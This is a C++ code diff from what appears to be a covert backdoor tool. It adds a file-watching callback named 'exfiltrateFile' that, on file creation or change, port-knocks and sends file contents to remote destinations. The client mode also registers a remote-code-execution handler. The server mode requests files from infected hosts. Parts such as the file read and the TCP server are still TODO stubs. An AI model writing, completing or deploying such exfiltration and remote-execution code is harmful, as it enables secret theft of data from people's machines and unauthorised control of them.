@@ -242,21 +242,23 @@ int clientMode(const Properties &p, char *programName) {
     unsigned short knockPort = std::stoi(p.at("knockPort"));
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
 
-    // create file monitor
-    EventCallback created = [&](const FileMonitor *fm, struct inotify_event *e) {
-        // TODO: port knock and send over network
-    };
-    EventCallback modified = [&](const FileMonitor *fm, struct inotify_event *e) {
-        // TODO: port knock and send over network
-
-    };
-    EventCallback deleted = [&](const FileMonitor *fm, struct inotify_event *e) {
-        // TODO: unused?
-    };
-    FileMonitor fm(created, modified, deleted);
-
     // create network engine
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
+
+    // create file monitor
+    EventCallback unusedFunction = [&](FileMonitor *fm, struct inotify_event *e) {};
+    EventCallback exfiltrateFile = [&](FileMonitor *fm, struct inotify_event *e) {
+        UCharVector contents;
+
+        // TODO: open file and read it into contents
+
+        for (const auto &dst : fm->getDestinations(e->wd)) {
+            struct in_addr daddr;
+            daddr.s_addr = dst;
+            netEngine.knockAndSend(daddr, contents);
+        }
+    };
+    FileMonitor fm(exfiltrateFile, exfiltrateFile, unusedFunction);
 
     // adding all the required callback functions
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
@@ -353,7 +355,7 @@ int serverMode(const Properties &p) {
             // send get command
             FileMonitor::sendRequest(tokens[2], daddr, &netEngine);
 
-            // start tcp server
+            // TODO: start tcp server
         }
 
         sleep(1);
